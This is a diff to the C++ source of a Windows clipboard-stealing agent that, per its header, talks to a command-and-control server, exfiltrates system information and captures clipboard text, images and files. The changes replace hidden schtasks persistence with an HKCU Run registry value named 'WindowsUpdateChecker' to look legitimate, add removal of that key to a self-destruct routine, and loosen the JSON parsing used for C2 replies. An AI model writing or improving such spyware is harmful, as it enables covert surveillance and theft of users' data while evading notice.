@@ -4,7 +4,7 @@
  *
  * Clipboard monitoring agent with C2 communication.
  * Capabilities: system info exfil, text/image/file clipboard capture,
- *               command polling (kill / persist via scheduled task).
+ *               command polling (kill / persist via HKCU Run registry key).
  *
  * Libs required (via #pragma): wininet, ws2_32, rpcrt4, shell32
  */
@@ -38,7 +38,7 @@ static const char* C2_HOST    = "127.0.0.1";
 static const int   C2_PORT    = 5000;
 static const int   POLL_MS    = 3000;
 static const char* REG_PATH   = "Software\\Microsoft\\Windows\\CurrentVersion\\ClipAgent";
-static const char* TASK_NAME  = "WindowsUpdateChecker";
+static const char* TASK_NAME  = "WindowsUpdateChecker"; // HKCU Run value name
 static const size_t MAX_FILE  = 50 * 1024 * 1024; // 50 MB cap for file uploads
 
 // ============================================================
@@ -144,13 +144,18 @@ static std::string JsonEscape(const std::string& s)
     return out;
 }
 
-// Simple search for a JSON string value: "key":"..."
+// Parses a JSON string value — handles optional whitespace after colon (Flask: "key": "value")
 static std::string JsonGetString(const std::string& json, const std::string& key)
 {
-    std::string search = "\"" + key + "\":\"";
-    size_t pos = json.find(search);
+    std::string needle = "\"" + key + "\"";
+    size_t pos = json.find(needle);
     if (pos == std::string::npos) return "";
-    pos += search.size();
+    pos += needle.size();
+    // Skip any whitespace and the colon between key and value
+    while (pos < json.size() && (json[pos] == ' ' || json[pos] == ':' || json[pos] == '\t'))
+        ++pos;
+    if (pos >= json.size() || json[pos] != '"') return "";
+    ++pos; // skip opening quote
     size_t end = json.find('"', pos);
     if (end == std::string::npos) return "";
     return json.substr(pos, end - pos);
@@ -467,6 +472,15 @@ static void SelfDestruct()
     // Remove agent ID from registry
     RegDeleteKeyA(HKEY_CURRENT_USER, REG_PATH);
 
+    // Remove persistence Run key if it was set
+    HKEY hRun = NULL;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER,
+                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                      0, KEY_SET_VALUE, &hRun) == ERROR_SUCCESS) {
+        RegDeleteValueA(hRun, TASK_NAME);
+        RegCloseKey(hRun);
+    }
+
     // Schedule self-deletion via a small batch file
     char exePath[MAX_PATH] = {};
     GetModuleFileNameA(NULL, exePath, MAX_PATH);
@@ -494,30 +508,22 @@ static void SelfDestruct()
 }
 
 // ============================================================
-//  Persistence — Windows Task Scheduler via schtasks
+//  Persistence — HKCU Run registry key (no admin required)
 // ============================================================
 static void AddPersistence()
 {
     char exePath[MAX_PATH] = {};
     GetModuleFileNameA(NULL, exePath, MAX_PATH);
 
-    // schtasks /create /tn <name> /tr "<exe>" /sc onlogon /rl highest /f
-    std::string cmd = "schtasks /create /tn \"" + std::string(TASK_NAME) +
-                      "\" /tr \"\\\"" + std::string(exePath) + "\\\"\"" +
-                      " /sc onlogon /rl highest /f";
-
-    STARTUPINFOA si = {};
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESHOWWINDOW;
-    si.wShowWindow = SW_HIDE;
-
-    PROCESS_INFORMATION pi = {};
-    std::string full = "cmd.exe /c " + cmd;
-    if (CreateProcessA(NULL, &full[0], NULL, NULL, FALSE,
-                       CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
-        WaitForSingleObject(pi.hProcess, 5000);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+    // HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+    // Triggered on every user login; no administrator privileges required.
+    HKEY hKey = NULL;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER,
+                      "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+                      0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
+        RegSetValueExA(hKey, TASK_NAME, 0, REG_SZ,
+                       (const BYTE*)exePath, (DWORD)(strlen(exePath) + 1));
+        RegCloseKey(hKey);
     }
 }
 
